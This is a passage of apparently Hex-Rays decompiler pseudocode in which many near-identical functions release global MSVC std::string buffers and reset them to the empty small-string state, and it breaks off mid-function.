// 4F9B78: using guessed type int dword_4F9B78;
// 4F9B7C: using guessed type int dword_4F9B7C;

//----- (0048B520) --------------------------------------------------------
void __cdecl sub_48B520()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F984C >= 0x10 )
  {
    v0 = dword_4F9838;
    if ( (unsigned int)(dword_4F984C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9838 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9838 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9848 = 0;
  dword_4F984C = 15;
  LOBYTE(dword_4F9838) = 0;
}
// 4F9848: using guessed type int dword_4F9848;
// 4F984C: using guessed type int dword_4F984C;

//----- (0048B580) --------------------------------------------------------
void __cdecl sub_48B580()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9AA4 >= 0x10 )
  {
    v0 = dword_4F9A90;
    if ( (unsigned int)(dword_4F9AA4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9A90 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9A90 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9AA0 = 0;
  dword_4F9AA4 = 15;
  LOBYTE(dword_4F9A90) = 0;
}
// 4F9AA0: using guessed type int dword_4F9AA0;
// 4F9AA4: using guessed type int dword_4F9AA4;

//----- (0048B5E0) --------------------------------------------------------
void __cdecl sub_48B5E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9A5C >= 0x10 )
  {
    v0 = dword_4F9A48;
    if ( (unsigned int)(dword_4F9A5C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9A48 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9A48 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9A58 = 0;
  dword_4F9A5C = 15;
  LOBYTE(dword_4F9A48) = 0;
}
// 4F9A58: using guessed type int dword_4F9A58;
// 4F9A5C: using guessed type int dword_4F9A5C;

//----- (0048B640) --------------------------------------------------------
void __cdecl sub_48B640()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9C6C >= 0x10 )
  {
    v0 = dword_4F9C58;
    if ( (unsigned int)(dword_4F9C6C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9C58 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9C58 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9C68 = 0;
  dword_4F9C6C = 15;
  LOBYTE(dword_4F9C58) = 0;
}
// 4F9C68: using guessed type int dword_4F9C68;
// 4F9C6C: using guessed type int dword_4F9C6C;

//----- (0048B6A0) --------------------------------------------------------
void __cdecl sub_48B6A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9FB4 >= 0x10 )
  {
    v0 = dword_4F9FA0;
    if ( (unsigned int)(dword_4F9FB4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9FA0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9FA0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9FB0 = 0;
  dword_4F9FB4 = 15;
  LOBYTE(dword_4F9FA0) = 0;
}
// 4F9FB0: using guessed type int dword_4F9FB0;
// 4F9FB4: using guessed type int dword_4F9FB4;

//----- (0048B700) --------------------------------------------------------
void __cdecl sub_48B700()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9DEC >= 0x10 )
  {
    v0 = dword_4F9DD8;
    if ( (unsigned int)(dword_4F9DEC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9DD8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9DD8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9DE8 = 0;
  dword_4F9DEC = 15;
  LOBYTE(dword_4F9DD8) = 0;
}
// 4F9DE8: using guessed type int dword_4F9DE8;
// 4F9DEC: using guessed type int dword_4F9DEC;

//----- (0048B760) --------------------------------------------------------
void __cdecl sub_48B760()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9D2C >= 0x10 )
  {
    v0 = dword_4F9D18;
    if ( (unsigned int)(dword_4F9D2C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9D18 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9D18 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9D28 = 0;
  dword_4F9D2C = 15;
  LOBYTE(dword_4F9D18) = 0;
}
// 4F9D28: using guessed type int dword_4F9D28;
// 4F9D2C: using guessed type int dword_4F9D2C;

//----- (0048B7C0) --------------------------------------------------------
void __cdecl sub_48B7C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9EAC >= 0x10 )
  {
    v0 = dword_4F9E98;
    if ( (unsigned int)(dword_4F9EAC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9E98 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9E98 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9EA8 = 0;
  dword_4F9EAC = 15;
  LOBYTE(dword_4F9E98) = 0;
}
// 4F9EA8: using guessed type int dword_4F9EA8;
// 4F9EAC: using guessed type int dword_4F9EAC;

//----- (0048B820) --------------------------------------------------------
void __cdecl sub_48B820()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9FFC >= 0x10 )
  {
    v0 = dword_4F9FE8;
    if ( (unsigned int)(dword_4F9FFC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9FE8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9FE8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9FF8 = 0;
  dword_4F9FFC = 15;
  LOBYTE(dword_4F9FE8) = 0;
}
// 4F9FF8: using guessed type int dword_4F9FF8;
// 4F9FFC: using guessed type int dword_4F9FFC;

//----- (0048B880) --------------------------------------------------------
void __cdecl sub_48B880()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9E34 >= 0x10 )
  {
    v0 = dword_4F9E20;
    if ( (unsigned int)(dword_4F9E34 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9E20 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9E20 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9E30 = 0;
  dword_4F9E34 = 15;
  LOBYTE(dword_4F9E20) = 0;
}
// 4F9E30: using guessed type int dword_4F9E30;
// 4F9E34: using guessed type int dword_4F9E34;

//----- (0048B8E0) --------------------------------------------------------
void __cdecl sub_48B8E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9FE4 >= 0x10 )
  {
    v0 = dword_4F9FD0;
    if ( (unsigned int)(dword_4F9FE4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9FD0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9FD0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9FE0 = 0;
  dword_4F9FE4 = 15;
  LOBYTE(dword_4F9FD0) = 0;
}
// 4F9FE0: using guessed type int dword_4F9FE0;
// 4F9FE4: using guessed type int dword_4F9FE4;

//----- (0048B940) --------------------------------------------------------
void __cdecl sub_48B940()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9E4C >= 0x10 )
  {
    v0 = dword_4F9E38;
    if ( (unsigned int)(dword_4F9E4C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9E38 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9E38 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9E48 = 0;
  dword_4F9E4C = 15;
  LOBYTE(dword_4F9E38) = 0;
}
// 4F9E48: using guessed type int dword_4F9E48;
// 4F9E4C: using guessed type int dword_4F9E4C;

//----- (0048B9A0) --------------------------------------------------------
void __cdecl sub_48B9A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA05C >= 0x10 )
  {
    v0 = dword_4FA048;
    if ( (unsigned int)(dword_4FA05C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA048 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA048 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA058 = 0;
  dword_4FA05C = 15;
  LOBYTE(dword_4FA048) = 0;
}
// 4FA058: using guessed type int dword_4FA058;
// 4FA05C: using guessed type int dword_4FA05C;

//----- (0048BA00) --------------------------------------------------------
void __cdecl sub_48BA00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9F84 >= 0x10 )
  {
    v0 = dword_4F9F70;
    if ( (unsigned int)(dword_4F9F84 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9F70 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9F70 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9F80 = 0;
  dword_4F9F84 = 15;
  LOBYTE(dword_4F9F70) = 0;
}
// 4F9F80: using guessed type int dword_4F9F80;
// 4F9F84: using guessed type int dword_4F9F84;

//----- (0048BA60) --------------------------------------------------------
void __cdecl sub_48BA60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA0D4 >= 0x10 )
  {
    v0 = dword_4FA0C0;
    if ( (unsigned int)(dword_4FA0D4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA0C0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA0C0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA0D0 = 0;
  dword_4FA0D4 = 15;
  LOBYTE(dword_4FA0C0) = 0;
}
// 4FA0D0: using guessed type int dword_4FA0D0;
// 4FA0D4: using guessed type int dword_4FA0D4;

//----- (0048BAC0) --------------------------------------------------------
void __cdecl sub_48BAC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9F0C >= 0x10 )
  {
    v0 = dword_4F9EF8;
    if ( (unsigned int)(dword_4F9F0C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9EF8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9EF8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9F08 = 0;
  dword_4F9F0C = 15;
  LOBYTE(dword_4F9EF8) = 0;
}
// 4F9F08: using guessed type int dword_4F9F08;
// 4F9F0C: using guessed type int dword_4F9F0C;

//----- (0048BB20) --------------------------------------------------------
void __cdecl sub_48BB20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9E64 >= 0x10 )
  {
    v0 = dword_4F9E50;
    if ( (unsigned int)(dword_4F9E64 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9E50 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9E50 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9E60 = 0;
  dword_4F9E64 = 15;
  LOBYTE(dword_4F9E50) = 0;
}
// 4F9E60: using guessed type int dword_4F9E60;
// 4F9E64: using guessed type int dword_4F9E64;

//----- (0048BB80) --------------------------------------------------------
void __cdecl sub_48BB80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9E7C >= 0x10 )
  {
    v0 = dword_4F9E68;
    if ( (unsigned int)(dword_4F9E7C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9E68 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9E68 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9E78 = 0;
  dword_4F9E7C = 15;
  LOBYTE(dword_4F9E68) = 0;
}
// 4F9E78: using guessed type int dword_4F9E78;
// 4F9E7C: using guessed type int dword_4F9E7C;

//----- (0048BBE0) --------------------------------------------------------
void __cdecl sub_48BBE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9D44 >= 0x10 )
  {
    v0 = dword_4F9D30;
    if ( (unsigned int)(dword_4F9D44 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9D30 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9D30 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9D40 = 0;
  dword_4F9D44 = 15;
  LOBYTE(dword_4F9D30) = 0;
}
// 4F9D40: using guessed type int dword_4F9D40;
// 4F9D44: using guessed type int dword_4F9D44;

//----- (0048BC40) --------------------------------------------------------
void __cdecl sub_48BC40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9EC4 >= 0x10 )
  {
    v0 = dword_4F9EB0;
    if ( (unsigned int)(dword_4F9EC4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9EB0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9EB0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9EC0 = 0;
  dword_4F9EC4 = 15;
  LOBYTE(dword_4F9EB0) = 0;
}
// 4F9EC0: using guessed type int dword_4F9EC0;
// 4F9EC4: using guessed type int dword_4F9EC4;

//----- (0048BCA0) --------------------------------------------------------
void __cdecl sub_48BCA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9F24 >= 0x10 )
  {
    v0 = dword_4F9F10;
    if ( (unsigned int)(dword_4F9F24 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9F10 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9F10 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9F20 = 0;
  dword_4F9F24 = 15;
  LOBYTE(dword_4F9F10) = 0;
}
// 4F9F20: using guessed type int dword_4F9F20;
// 4F9F24: using guessed type int dword_4F9F24;

//----- (0048BD00) --------------------------------------------------------
void __cdecl sub_48BD00()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9F9C >= 0x10 )
  {
    v0 = dword_4F9F88;
    if ( (unsigned int)(dword_4F9F9C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9F88 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9F88 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9F98 = 0;
  dword_4F9F9C = 15;
  LOBYTE(dword_4F9F88) = 0;
}
// 4F9F98: using guessed type int dword_4F9F98;
// 4F9F9C: using guessed type int dword_4F9F9C;

//----- (0048BD60) --------------------------------------------------------
void __cdecl sub_48BD60()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9F6C >= 0x10 )
  {
    v0 = dword_4F9F58;
    if ( (unsigned int)(dword_4F9F6C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9F58 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9F58 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9F68 = 0;
  dword_4F9F6C = 15;
  LOBYTE(dword_4F9F58) = 0;
}
// 4F9F68: using guessed type int dword_4F9F68;
// 4F9F6C: using guessed type int dword_4F9F6C;

//----- (0048BDC0) --------------------------------------------------------
void __cdecl sub_48BDC0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9DD4 >= 0x10 )
  {
    v0 = dword_4F9DC0;
    if ( (unsigned int)(dword_4F9DD4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9DC0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9DC0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9DD0 = 0;
  dword_4F9DD4 = 15;
  LOBYTE(dword_4F9DC0) = 0;
}
// 4F9DD0: using guessed type int dword_4F9DD0;
// 4F9DD4: using guessed type int dword_4F9DD4;

//----- (0048BE20) --------------------------------------------------------
void __cdecl sub_48BE20()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9C9C >= 0x10 )
  {
    v0 = dword_4F9C88;
    if ( (unsigned int)(dword_4F9C9C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9C88 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9C88 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9C98 = 0;
  dword_4F9C9C = 15;
  LOBYTE(dword_4F9C88) = 0;
}
// 4F9C98: using guessed type int dword_4F9C98;
// 4F9C9C: using guessed type int dword_4F9C9C;

//----- (0048BE80) --------------------------------------------------------
void __cdecl sub_48BE80()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9CFC >= 0x10 )
  {
    v0 = dword_4F9CE8;
    if ( (unsigned int)(dword_4F9CFC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9CE8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9CE8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9CF8 = 0;
  dword_4F9CFC = 15;
  LOBYTE(dword_4F9CE8) = 0;
}
// 4F9CF8: using guessed type int dword_4F9CF8;
// 4F9CFC: using guessed type int dword_4F9CFC;

//----- (0048BEE0) --------------------------------------------------------
void __cdecl sub_48BEE0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA0A4 >= 0x10 )
  {
    v0 = dword_4FA090;
    if ( (unsigned int)(dword_4FA0A4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA090 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA090 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA0A0 = 0;
  dword_4FA0A4 = 15;
  LOBYTE(dword_4FA090) = 0;
}
// 4FA0A0: using guessed type int dword_4FA0A0;
// 4FA0A4: using guessed type int dword_4FA0A4;

//----- (0048BF40) --------------------------------------------------------
void __cdecl sub_48BF40()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA08C >= 0x10 )
  {
    v0 = dword_4FA078;
    if ( (unsigned int)(dword_4FA08C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA078 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA078 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA088 = 0;
  dword_4FA08C = 15;
  LOBYTE(dword_4FA078) = 0;
}
// 4FA088: using guessed type int dword_4FA088;
// 4FA08C: using guessed type int dword_4FA08C;

//----- (0048BFA0) --------------------------------------------------------
void __cdecl sub_48BFA0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9CCC >= 0x10 )
  {
    v0 = dword_4F9CB8;
    if ( (unsigned int)(dword_4F9CCC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9CB8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9CB8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9CC8 = 0;
  dword_4F9CCC = 15;
  LOBYTE(dword_4F9CB8) = 0;
}
// 4F9CC8: using guessed type int dword_4F9CC8;
// 4F9CCC: using guessed type int dword_4F9CCC;

//----- (0048C000) --------------------------------------------------------
void __cdecl sub_48C000()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9E94 >= 0x10 )
  {
    v0 = dword_4F9E80;
    if ( (unsigned int)(dword_4F9E94 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9E80 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9E80 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9E90 = 0;
  dword_4F9E94 = 15;
  LOBYTE(dword_4F9E80) = 0;
}
// 4F9E90: using guessed type int dword_4F9E90;
// 4F9E94: using guessed type int dword_4F9E94;

//----- (0048C060) --------------------------------------------------------
void __cdecl sub_48C060()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9CB4 >= 0x10 )
  {
    v0 = dword_4F9CA0;
    if ( (unsigned int)(dword_4F9CB4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9CA0 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9CA0 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9CB0 = 0;
  dword_4F9CB4 = 15;
  LOBYTE(dword_4F9CA0) = 0;
}
// 4F9CB0: using guessed type int dword_4F9CB0;
// 4F9CB4: using guessed type int dword_4F9CB4;

//----- (0048C0C0) --------------------------------------------------------
void __cdecl sub_48C0C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA02C >= 0x10 )
  {
    v0 = dword_4FA018;
    if ( (unsigned int)(dword_4FA02C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA018 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA018 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA028 = 0;
  dword_4FA02C = 15;
  LOBYTE(dword_4FA018) = 0;
}
// 4FA028: using guessed type int dword_4FA028;
// 4FA02C: using guessed type int dword_4FA02C;

//----- (0048C120) --------------------------------------------------------
void __cdecl sub_48C120()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9D14 >= 0x10 )
  {
    v0 = dword_4F9D00;
    if ( (unsigned int)(dword_4F9D14 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9D00 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9D00 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9D10 = 0;
  dword_4F9D14 = 15;
  LOBYTE(dword_4F9D00) = 0;
}
// 4F9D10: using guessed type int dword_4F9D10;
// 4F9D14: using guessed type int dword_4F9D14;

//----- (0048C180) --------------------------------------------------------
void __cdecl sub_48C180()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9D8C >= 0x10 )
  {
    v0 = dword_4F9D78;
    if ( (unsigned int)(dword_4F9D8C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9D78 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9D78 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9D88 = 0;
  dword_4F9D8C = 15;
  LOBYTE(dword_4F9D78) = 0;
}
// 4F9D88: using guessed type int dword_4F9D88;
// 4F9D8C: using guessed type int dword_4F9D8C;

//----- (0048C1E0) --------------------------------------------------------
void __cdecl sub_48C1E0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9DBC >= 0x10 )
  {
    v0 = dword_4F9DA8;
    if ( (unsigned int)(dword_4F9DBC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9DA8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9DA8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9DB8 = 0;
  dword_4F9DBC = 15;
  LOBYTE(dword_4F9DA8) = 0;
}
// 4F9DB8: using guessed type int dword_4F9DB8;
// 4F9DBC: using guessed type int dword_4F9DBC;

//----- (0048C240) --------------------------------------------------------
void __cdecl sub_48C240()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9D5C >= 0x10 )
  {
    v0 = dword_4F9D48;
    if ( (unsigned int)(dword_4F9D5C + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9D48 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9D48 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9D58 = 0;
  dword_4F9D5C = 15;
  LOBYTE(dword_4F9D48) = 0;
}
// 4F9D58: using guessed type int dword_4F9D58;
// 4F9D5C: using guessed type int dword_4F9D5C;

//----- (0048C2A0) --------------------------------------------------------
void __cdecl sub_48C2A0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA0BC >= 0x10 )
  {
    v0 = dword_4FA0A8;
    if ( (unsigned int)(dword_4FA0BC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA0A8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA0A8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA0B8 = 0;
  dword_4FA0BC = 15;
  LOBYTE(dword_4FA0A8) = 0;
}
// 4FA0B8: using guessed type int dword_4FA0B8;
// 4FA0BC: using guessed type int dword_4FA0BC;

//----- (0048C300) --------------------------------------------------------
void __cdecl sub_48C300()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9DA4 >= 0x10 )
  {
    v0 = dword_4F9D90;
    if ( (unsigned int)(dword_4F9DA4 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9D90 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9D90 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9DA0 = 0;
  dword_4F9DA4 = 15;
  LOBYTE(dword_4F9D90) = 0;
}
// 4F9DA0: using guessed type int dword_4F9DA0;
// 4F9DA4: using guessed type int dword_4F9DA4;

//----- (0048C360) --------------------------------------------------------
void __cdecl sub_48C360()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9D74 >= 0x10 )
  {
    v0 = dword_4F9D60;
    if ( (unsigned int)(dword_4F9D74 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9D60 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9D60 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9D70 = 0;
  dword_4F9D74 = 15;
  LOBYTE(dword_4F9D60) = 0;
}
// 4F9D70: using guessed type int dword_4F9D70;
// 4F9D74: using guessed type int dword_4F9D74;

//----- (0048C3C0) --------------------------------------------------------
void __cdecl sub_48C3C0()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9C84 >= 0x10 )
  {
    v0 = dword_4F9C70;
    if ( (unsigned int)(dword_4F9C84 + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4F9C70 - 1);
      if ( (unsigned int)((_BYTE *)dword_4F9C70 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4F9C80 = 0;
  dword_4F9C84 = 15;
  LOBYTE(dword_4F9C70) = 0;
}
// 4F9C80: using guessed type int dword_4F9C80;
// 4F9C84: using guessed type int dword_4F9C84;

//----- (0048C420) --------------------------------------------------------
void __cdecl sub_48C420()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4FA0EC >= 0x10 )
  {
    v0 = dword_4FA0D8;
    if ( (unsigned int)(dword_4FA0EC + 1) >= 0x1000 )
    {
      v0 = (_BYTE *)*((_DWORD *)dword_4FA0D8 - 1);
      if ( (unsigned int)((_BYTE *)dword_4FA0D8 - v0 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v0);
  }
  dword_4FA0E8 = 0;
  dword_4FA0EC = 15;
  LOBYTE(dword_4FA0D8) = 0;
}
// 4FA0E8: using guessed type int dword_4FA0E8;
// 4FA0EC: using guessed type int dword_4FA0EC;

//----- (0048C480) --------------------------------------------------------
void __cdecl sub_48C480()
{
  _BYTE *v0; // ecx

  if ( (unsigned int)dword_4F9F54 >= 0x10 )
  {
